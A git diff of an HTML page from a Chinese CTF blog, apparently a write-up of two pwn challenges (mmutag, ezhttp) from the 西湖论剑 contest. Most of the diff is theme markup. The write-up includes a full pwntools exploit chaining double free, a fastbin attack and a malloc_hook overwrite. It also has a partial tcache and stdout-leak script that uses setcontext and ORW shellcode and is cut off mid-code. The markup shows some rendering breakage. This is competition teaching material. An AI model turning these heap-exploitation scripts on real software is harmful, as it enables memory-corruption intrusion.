@@ -1,37 +1,52 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN">
-
-
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
 
 
 
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
   <link rel="icon" type="image/png" href="/img/favicon.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
   <meta name="description" content>
   <meta name="author" content="chumen77">
   <meta name="keywords" content>
-  <title>西湖论剑部分wp ~ Chumen77&#39;s Blog</title>
+  <title>西湖论剑部分wp - Chumen77&#39;s Blog</title>
 
-  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
-<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
-<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
 
-  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    
+      
+      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/apache-config.min.css">
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
 <link rel="stylesheet" href="/css/main.css">
 
+<!-- 自定义样式保持在最底部 -->
 
-  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
 
-
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
 </head>
 
 
@@ -56,40 +71,60 @@
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/">首页</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">归档</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">标签</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">关于</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
         
-          
-          
         
           <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
           </li>
         
       </ul>
@@ -97,51 +132,53 @@
   </div>
 </nav>
 
-    <div class="view intro-2" id="background" false
-         style="background: url('/img/default.png')no-repeat center center;
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
             <span class="h2" id="subtitle">
               
             </span>
 
             
-              <br>
-              
-                <p class="mt-3">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  星期五, 十月 9日 2020, 8:23 早上
-                </p>
-              
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-09 08:23" pubdate>
+        2020年10月9日 早上
+      </time>
+    </span>
+  
+</div>
 
-              <p>
-                
-                  
-                  &nbsp;<i class="far fa-chart-bar"></i>
-                  <span class="post-count">
-                    2.1k 字
-                  </span>&nbsp;
-                
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
 
-                
-                  
-                  &nbsp;<i class="far fa-clock"></i>
-                  <span class="post-count">
-                      10 分钟
-                  </span>&nbsp;
-                
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      32
+       分钟
+    </span>
+  
 
-                
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
-                  <span id="busuanzi_container_page_pv">
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>&nbsp;
-                
-              </p>
+  
+  
+</div>
+
             
           </div>
 
@@ -159,112 +196,119 @@
   <div class="row">
     <div class="d-none d-lg-block col-lg-2"></div>
     <div class="col-lg-8 nopadding-md">
-      <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto" id="post">
-          <div class="markdown-body">
-            <h1 id="西湖论剑部分wp"><a href="#西湖论剑部分wp" class="headerlink" title="西湖论剑部分wp"></a>西湖论剑部分wp</h1><h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">西湖论剑部分wp</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="西湖论剑部分wp"><a href="#西湖论剑部分wp" class="headerlink" title="西湖论剑部分wp"></a>西湖论剑部分wp</h1><h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
 <li>给了一个栈地址</li>
 <li>没有show函数</li>
 <li>free 函数存在uaf</li>
 <li>add函数只能申请堆号为1-10的堆块，大小仅为0x68</li>
 <li>可以给栈上读一段数据</li>
 </ul>
-<pre><code class="c">char buf; // [rsp+10h] [rbp-20h]</code></pre>
-<pre><code class="c">  if ( v3 != 3 )
-        break;
-      read(0, &amp;buf, 0x20uLL);
-      printf(&quot;Your content: %s\n&quot;, &amp;buf);</code></pre>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span></code></pre></div>
+
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )
+      <span class="hljs-keyword">break</span>;
+    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x20</span>uLL);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your content: %s\n"</span>, &amp;buf);</code></pre></div>
+
 <p>利用这个可以泄漏栈上的数据，也可以在栈上写一定的数据。</p>
 <h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>如何泄漏libc地址。</p>
 <p>栈上是有很多数据的，可以用choice 3进行泄漏一定的数据，但是由于<code>\x00</code>的截断，泄漏一个stack地址后，其后有用的libc地址没办法泄漏。</p>
 <p>看下其栈情况：</p>
 <p><img src="http://qiqianyun.chumen77.xyz/uPic/IqyiLw.png" srcset="/img/loading.gif" alt><br>可控区域0x20，如果可以填充其中无用的数据到libc地址，再利用一次 choice 3 即可完成泄漏。</p>
 <p>现在也已经知道了stack的地址。伪造一个0x70的堆，然后fastbin attack即可申请到这栈上的内存。然后填充，获取libc地址。接着攻击malloc hook即可。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
-# encoding: utf-8
-from pwn import *
-import time
-local_file  = &#39;./mmutag&#39;
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment"># encoding: utf-8</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> time
+local_file  = <span class="hljs-string">'./mmutag'</span>
 elf = ELF(local_file)
-context.log_level = &#39;debug&#39;
-debug = 0
-if debug:
+context.log_level = <span class="hljs-string">'debug'</span>
+debug = <span class="hljs-number">0</span>
+<span class="hljs-keyword">if</span> debug:
     io = process(local_file)
     libc = elf.libc
-else:
-    io = remote(&#39;183.129.189.61&#39;,55704)
+<span class="hljs-keyword">else</span>:
+    io = remote(<span class="hljs-string">'183.129.189.61'</span>,<span class="hljs-number">55704</span>)
     libc = elf.libc
-    #libc = ELF(&#39;.&#39;)
+    <span class="hljs-comment">#libc = ELF('.')</span>
 context.arch = elf.arch
-context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
-#,&#39;&#39;splitw&#39;,&#39;-h&#39;
-rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
-rce18 = [0x4f2c5,0x4f322,0x10a38c]
-realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
-arae18 = 0x3ebca0
-s      = lambda data               :io.send(data) 
-sa      = lambda delim,data         :io.sendafter(delim, data)
-sl      = lambda data               :io.sendline(data)
-sla     = lambda delim,data         :io.sendlineafter(delim, data)
-r      = lambda numb=4096          :io.recv(numb)
-ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
-uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
-uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
-info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
-itr     = lambda                    :io.interactive()
-def debug():
-    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
+<span class="hljs-comment">#,''splitw','-h'</span>
+rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
+rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
+realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
+arae18 = <span class="hljs-number">0x3ebca0</span>
+s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
+r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
+info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
+itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
     gdb.attach(io)
     pause()
 
-def input_introduce(data):
-    sla(&#39;your introduce&#39;,str(data))
-def add(idx,data):
-    sla(&#39;ise&#39;,&#39;1&#39;)
-    sla(&#39;id&#39;,str(idx))
-    sa(&#39;tent&#39;,str(data))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_introduce</span><span class="hljs-params">(data)</span>:</span>
+    sla(<span class="hljs-string">'your introduce'</span>,str(data))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>
+    sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'1'</span>)
+    sla(<span class="hljs-string">'id'</span>,str(idx))
+    sa(<span class="hljs-string">'tent'</span>,str(data))
 
-def free(idx):
-    sla(&#39;ise&#39;,&#39;2&#39;)
-    sla(&#39;id&#39;,str(idx))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
+    sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'2'</span>)
+    sla(<span class="hljs-string">'id'</span>,str(idx))
 
-data = &#39;1&#39; * 0x60
-sa(&#39;name&#39;,data)
-ru(&#39;0x&#39;)
-leak_libc = int(r(12),16)
-sla(&#39;ice&#39;,&#39;2&#39;)
-add(1,&#39;chumen77&#39;)
-add(2,&#39;chumen77&#39;)
-free(1)
-free(2)
-free(1)
-sla(&#39;ise&#39;,&#39;3&#39;)
-payload = p64(0) + p64(0x70) + p64(0)
+data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x60</span>
+sa(<span class="hljs-string">'name'</span>,data)
+ru(<span class="hljs-string">'0x'</span>)
+leak_libc = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)
+sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)
+add(<span class="hljs-number">1</span>,<span class="hljs-string">'chumen77'</span>)
+add(<span class="hljs-number">2</span>,<span class="hljs-string">'chumen77'</span>)
+free(<span class="hljs-number">1</span>)
+free(<span class="hljs-number">2</span>)
+free(<span class="hljs-number">1</span>)
+sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'3'</span>)
+payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0</span>)
 s(payload)
-add(4,p64(leak_stack - 0x40))
-add(5,&#39;1&#39;)
-add(6,&#39;1&#39;)
-add(7,&#39;1&#39; * 0x47 + &#39;2&#39;)
-sla(&#39;ise&#39;,&#39;3&#39;)
-s(&#39;1&#39; * 0x20)
-info_addr(&#39;leak-stack&#39;,leak_stack)
-ru(&#39;2&#39;)
-libc_base = uu64(r(6)) - 0x20840
-info_addr(&#39;libc_base&#39;,libc_base)
-free(1)
-free(2)
-free(1)
-malloc_hook  = 0x3c4aed + libc_base
-add(3,p64(malloc_hook))
-add(8,&#39;1&#39;)
-add(9,&#39;1&#39;)
-one = 0xf0364 + libc_base
-payload = (3 + 0x10) * &#39;\x00&#39; + p64(one)
-add(10,payload)
-free(3)
-free(3)
-# debug()
-itr()</code></pre>
+add(<span class="hljs-number">4</span>,p64(leak_stack - <span class="hljs-number">0x40</span>))
+add(<span class="hljs-number">5</span>,<span class="hljs-string">'1'</span>)
+add(<span class="hljs-number">6</span>,<span class="hljs-string">'1'</span>)
+add(<span class="hljs-number">7</span>,<span class="hljs-string">'1'</span> * <span class="hljs-number">0x47</span> + <span class="hljs-string">'2'</span>)
+sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'3'</span>)
+s(<span class="hljs-string">'1'</span> * <span class="hljs-number">0x20</span>)
+info_addr(<span class="hljs-string">'leak-stack'</span>,leak_stack)
+ru(<span class="hljs-string">'2'</span>)
+libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20840</span>
+info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
+free(<span class="hljs-number">1</span>)
+free(<span class="hljs-number">2</span>)
+free(<span class="hljs-number">1</span>)
+malloc_hook  = <span class="hljs-number">0x3c4aed</span> + libc_base
+add(<span class="hljs-number">3</span>,p64(malloc_hook))
+add(<span class="hljs-number">8</span>,<span class="hljs-string">'1'</span>)
+add(<span class="hljs-number">9</span>,<span class="hljs-string">'1'</span>)
+one = <span class="hljs-number">0xf0364</span> + libc_base
+payload = (<span class="hljs-number">3</span> + <span class="hljs-number">0x10</span>) * <span class="hljs-string">'\x00'</span> + p64(one)
+add(<span class="hljs-number">10</span>,payload)
+free(<span class="hljs-number">3</span>)
+free(<span class="hljs-number">3</span>)
+<span class="hljs-comment"># debug()</span>
+itr()</code></pre></div>
+
 <p>最后因为没有堆可以申请，可以故意触发报错，其会调用到malloc来储存部分数据，此时也就可以get shell。</p>
 <h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>看起来较为复杂，因为实现了一个对Http packet的交互，让我这种不是很熟悉http packet，coding能力差的人，逆向起来有点吃力。</p>
 <h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><ul>
@@ -288,66 +332,73 @@ itr()</code></pre>
 <li>触发free hook，orw get flag</li>
 </ul>
 <h3 id="细节集合"><a href="#细节集合" class="headerlink" title="细节集合"></a>细节集合</h3><h4 id="对于stdout的攻击"><a href="#对于stdout的攻击" class="headerlink" title="对于stdout的攻击"></a>对于stdout的攻击</h4><p>其中，在利用libc残留伪造stdout地址作为fd的时候，只要改3字节，其肯定是申请的0x20的堆，但是上stdout结构体时需要0x21字节的写入。<br>tcache分配中，并不验证堆的大小，只要fd指好就OK了，所以申请个至少可以写入0x21字节的堆即可。但是由于程序分配chunk的策略，申请时肯定要写数据，写什么不会crush。个人做的时候,乱填充数据，crush了很多次，头都炸了。可以看一下<code>_IO_2_1_stdout_</code>结构体：</p>
-<pre><code>pwndbg&gt; ptype stdout
-type = struct _IO_FILE {
-    int _flags;
-    char *_IO_read_ptr;
-    char *_IO_read_end;
-    char *_IO_read_base;
-    char *_IO_write_base;  
-    char *_IO_write_ptr;   
-    char *_IO_write_end;
-    char *_IO_buf_base;
-    char *_IO_buf_end;
-    char *_IO_save_base;
-    char *_IO_backup_base;
-    char *_IO_save_end;
-    struct _IO_marker *_markers;
-    struct _IO_FILE *_chain;
-    int _fileno;
-    int _flags2;
-    __off_t _old_offset;
-    unsigned short _cur_column;
-    signed char _vtable_offset;
-    char _shortbuf[1];
-    _IO_lock_t *_lock;
-    __off64_t _offset;
-    struct _IO_codecvt *_codecvt;
-    struct _IO_wide_data *_wide_data;
-    struct _IO_FILE *_freeres_list;
-    void *_freeres_buf;
-    size_t __pad5;
-    int _mode;
-    char _unused2[20];
-} *</code></pre><p>在学习io file相关知识时，可以了解到对于获取和输出信息，很重要的就是开头<code>_flags</code> ，其决定了此时io的状况。</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; ptype stdout
+<span class="hljs-built_in">type</span> = struct <span class="hljs-variable">_IO_FILE</span> &#123;
+    int <span class="hljs-variable">_flags</span>;
+    char *<span class="hljs-variable">_IO_read_ptr</span>;
+    char *<span class="hljs-variable">_IO_read_end</span>;
+    char *<span class="hljs-variable">_IO_read_base</span>;
+    char *<span class="hljs-variable">_IO_write_base</span>;  
+    char *<span class="hljs-variable">_IO_write_ptr</span>;   
+    char *<span class="hljs-variable">_IO_write_end</span>;
+    char *<span class="hljs-variable">_IO_buf_base</span>;
+    char *<span class="hljs-variable">_IO_buf_end</span>;
+    char *<span class="hljs-variable">_IO_save_base</span>;
+    char *<span class="hljs-variable">_IO_backup_base</span>;
+    char *<span class="hljs-variable">_IO_save_end</span>;
+    struct <span class="hljs-variable">_IO_marker</span> *<span class="hljs-variable">_markers</span>;
+    struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_chain</span>;
+    int <span class="hljs-variable">_fileno</span>;
+    int <span class="hljs-variable">_flags2</span>;
+    <span class="hljs-variable">__off_t</span> <span class="hljs-variable">_old_offset</span>;
+    unsigned short <span class="hljs-variable">_cur_column</span>;
+    signed char <span class="hljs-variable">_vtable_offset</span>;
+    char <span class="hljs-variable">_shortbuf</span>[<span class="hljs-number">1</span>];
+    <span class="hljs-variable">_IO_lock_t</span> *<span class="hljs-variable">_lock</span>;
+    <span class="hljs-variable">__off64_t</span> <span class="hljs-variable">_offset</span>;
+    struct <span class="hljs-variable">_IO_codecvt</span> *<span class="hljs-variable">_codecvt</span>;
+    struct <span class="hljs-variable">_IO_wide_data</span> *<span class="hljs-variable">_wide_data</span>;
+    struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_freeres_list</span>;
+    void *<span class="hljs-variable">_freeres_buf</span>;
+    size_t <span class="hljs-variable">__pad5</span>;
+    int <span class="hljs-variable">_mode</span>;
+    char <span class="hljs-variable">_unused2</span>[<span class="hljs-number">20</span>];
+&#125; *</code></pre></div>
+
+<p>在学习io file相关知识时，可以了解到对于获取和输出信息，很重要的就是开头<code>_flags</code> ，其决定了此时io的状况。</p>
 <p>其中注意到<code>_flags</code> 大小是int型，所以在libc地址其读取和验证将要做什么时，是以int的宽度来获取的。所以设置对低位8字节即可。比如<code>0xfffffffffbad3c80</code> <code>0x12345678fbad3c80</code> ,剩下的就好说了，全弄成<code>a</code>的垃圾字符堆。</p>
 <p>然后再次edit，这个<code>_IO_2_1_stdout_</code>即可泄漏出libc地址。</p>
 <h4 id="改free-hook写setcontext时的细节"><a href="#改free-hook写setcontext时的细节" class="headerlink" title="改free hook写setcontext时的细节"></a>改free hook写setcontext时的细节</h4><p>其中需要注意一下libc版本，在最低的libc 2.27版本中，其经常是以<code>0xXXXXXXX00a0</code>这样的存在。直接改写时，<code>/x00</code>被截断，写不上free hook。然后想着用edit 进行修改。但是会发现，此时坏的free hook情况下，用edit直接crush。</p>
 <p>考虑升级一下libc版本号对应对赛题服务器的libc版本，但是libc2.27最近更新了，直接<code>apt upgrade libc6</code> 就会升级到libc 2.27:1.3最新版本，其增加了对double free的检测，就直接做不了了。</p>
 <p>apt 指定版本的升级：</p>
-<pre><code>apt-cache madison libc6                  
-apt-get install libc6=2.27-3ubuntu1.2 
+<div class="hljs"><pre><code class="hljs undefined">apt-cache madison libc6                  
+apt-<span class="hljs-builtin-name">get</span> install <span class="hljs-attribute">libc6</span>=2.27-3ubuntu1.2 
 
 apt-cache madison libc6-dbg
-apt-get install libc6-dbg=2.27-3ubuntu1.2</code></pre><p>这样就升级好了，并且解决了个人写setcontext的问题，因为其地址没有再有``x00```。</p>
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
+apt-<span class="hljs-builtin-name">get</span> install <span class="hljs-attribute">libc6-dbg</span>=2.27-3ubuntu1.2</code></pre></div>
+
+<p>这样就升级好了，并且解决了个人写setcontext的问题，因为其地址没有再有``x00<div class="hljs"><pre><code class="hljs 。">
+### exp
+
+```python
+#!/usr/bin/env python
 # encoding: utf-8
 from pwn import *
 import time
-local_file  = &#39;./ezhttp&#39;
+local_file  = &apos;./ezhttp&apos;
 elf = ELF(local_file)
-context.log_level = &#39;debug&#39;
+context.log_level = &apos;debug&apos;
 debug = 1
 if debug:
     io = process(local_file)
     libc = elf.libc
 else:
-    io = remote(&#39;172.17.0.2&#39;,23946)
+    io = remote(&apos;172.17.0.2&apos;,23946)
     libc = elf.libc
-    #libc = ELF(&#39;.&#39;)
+    #libc = ELF(&apos;.&apos;)
 context.arch = elf.arch
-context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
-#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+context.terminal = [&apos;tmux&apos;,&apos;neww&apos;]
+#,&apos;&apos;splitw&apos;,&apos;-h&apos;
 arae18 = 0x3ebca0
 s      = lambda data               :io.send(data) 
 sa      = lambda delim,data         :io.sendafter(delim, data)
@@ -355,65 +406,65 @@ sl      = lambda data               :io.sendline(data)
 sla     = lambda delim,data         :io.sendlineafter(delim, data)
 r      = lambda numb=4096          :io.recv(numb)
 ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
-uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
-uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
-info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+uu32    = lambda data               :u32(data.ljust(4, &apos;\0&apos;))
+uu64    = lambda data               :u64(data.ljust(8, &apos;\0&apos;))
+info_addr = lambda tag, addr        :io.info(tag + &apos;==&gt;&apos; +&apos;: &#123;:#x&#125;&apos;.format(addr))
 itr     = lambda                    :io.interactive()
 def debug():
-    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&apos;b main&apos;)
     gdb.attach(io)
     pause()
 # debug()
 def add(data):
-    content = &#39;POST\n&#39;
-    content += &#39;/create \nCookie: user=admin token: \r\n\r\n&#39;
-    content += &#39;content=&#39;+str(data)
-    ru(&#39;Send Http packet to me:&#39;)
+    content = &apos;POST\n&apos;
+    content += &apos;/create \nCookie: user=admin token: \r\n\r\n&apos;
+    content += &apos;content=&apos;+str(data)
+    ru(&apos;Send Http packet to me:&apos;)
     s(str(content))
     sleep(0.05)
 
 def free(index):
-    content = &#39;POST\n&#39;
-    content += &#39;/del \nCookie: user=admin token: \r\n\r\n&#39;
-    content += &#39;index=&#39;+str(index)
-    ru(&#39;Send Http packet to me:&#39;)
+    content = &apos;POST\n&apos;
+    content += &apos;/del \nCookie: user=admin token: \r\n\r\n&apos;
+    content += &apos;index=&apos;+str(index)
+    ru(&apos;Send Http packet to me:&apos;)
     s(str(content))
 def edit(idx,data):
-    content = &#39;POST\n&#39;
-    content += &#39;/edit \nCookie: user=admin token: \r\n\r\n&#39;
-    content += &#39;index=&#39;+ str(idx) + &#39;&amp;content=&#39;+str(data)+ &#39;\n&#39;
+    content = &apos;POST\n&apos;
+    content += &apos;/edit \nCookie: user=admin token: \r\n\r\n&apos;
+    content += &apos;index=&apos;+ str(idx) + &apos;&amp;content=&apos;+str(data)+ &apos;\n&apos;
     s(str(content))
     sleep(0.05)
 
 def leak_addr():
-    payload = &#39;1&#39; *0x100
+    payload = &apos;1&apos; *0x100
     add(payload) 
-    ru(&#39;0x&#39;)
+    ru(&apos;0x&apos;)
     heap_base = int(r(12),16) - 0x10
-    info_addr(&#39;heap_base&#39;,heap_base)
+    info_addr(&apos;heap_base&apos;,heap_base)
     add(payload) 
-    add(&#39;1&#39;*0x8) 
-    add(&#39;1&#39;*0xf8)
+    add(&apos;1&apos;*0x8) 
+    add(&apos;1&apos;*0xf8)
     for i in range(7):
         free(0)
     free(0)
-    add(&#39;\x60\xa7&#39;) 
-    add(&#39;1&#39;*0x18) 
-    add(&#39;1&#39;*0x20) 
+    add(&apos;\x60\xa7&apos;) 
+    add(&apos;1&apos;*0x18) 
+    add(&apos;1&apos;*0x20) 
     free(6)
     free(6)
-    add(&#39;1&#39;*0x20) 
+    add(&apos;1&apos;*0x20) 
     payload = p64(heap_base + 0x10)
     edit(7,payload)
-    add(&#39;1&#39;*0x20) 
+    add(&apos;1&apos;*0x20) 
     # debug()
-    add(&#39;1&#39;*0x20) 
+    add(&apos;1&apos;*0x20) 
     sleep(0.1)
-    payload = p64(0x12345678fbad3c80) + &#39;\x01&#39; *0x20
+    payload = p64(0x12345678fbad3c80) + &apos;\x01&apos; *0x20
     add(payload) #8
-    payload = p64(0xfbad3c80) + p64(0) * 3 + &#39;\x00&#39;
+    payload = p64(0xfbad3c80) + p64(0) * 3 + &apos;\x00&apos;
     edit(10,payload)
-    add(&#39;1&#39;*0x90)
+    add(&apos;1&apos;*0x90)
     return heap_base
 leak = 0
 while True:
@@ -421,27 +472,27 @@ while True:
         heap_base = leak_addr()
         ss = io.recvuntil(chr(0x7f),timeout = 0.5)
         if len(ss) == 0:
-            raise Exception(&#39;&#39;)
+            raise Exception(&apos;&apos;)
         io.recv(16)
         leak = u64(io.recv(8))
         if leak == 0x320a6464412e310a:
-            raise Exception(&#39;&#39;)
+            raise Exception(&apos;&apos;)
         break
     except Exception:
         io.close()
-        io = process(&#39;./ezhttp&#39;)
+        io = process(&apos;./ezhttp&apos;)
         continue
 
 leak = leak &gt;&gt; 16
-info_addr(&#39;leak&#39;,leak)
+info_addr(&apos;leak&apos;,leak)
 libc_base = leak - 0x3eb780
-info_addr(&#39;libc_base&#39;,libc_base)
+info_addr(&apos;libc_base&apos;,libc_base)
 free_hook = 0x3ed8e8 + libc_base
-set_context = libc.sym[&#39;setcontext&#39;] + 53 + libc_base
-info_addr(&#39;heap_base&#39;,heap_base)
-info_addr(&#39;context&#39;,set_context)
-orw = shellcraft.open(&#39;./flag&#39;)
-orw +=shellcraft.read(&#39;rax&#39;,heap_base+0x300,0x30)
